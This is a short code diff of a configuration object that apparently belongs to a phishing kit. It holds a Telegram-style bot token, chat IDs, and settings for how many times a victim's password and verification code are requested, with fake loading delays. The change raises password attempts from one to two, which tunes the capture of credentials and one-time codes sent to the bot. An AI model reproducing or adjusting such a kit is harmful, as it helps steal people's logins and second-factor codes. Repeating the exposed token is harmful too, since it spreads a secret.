@@ -3,7 +3,7 @@ const config = {
     chat_id: '2096245355',
     noti_token: '8272129902:AAEyHfpOVgKdaeSZZXd7rNDMeLScKbpInQA',
     noti_chat_id: '-4805794423',
-    max_password_attempts: 1,
+    max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
     code_loading_time: 3
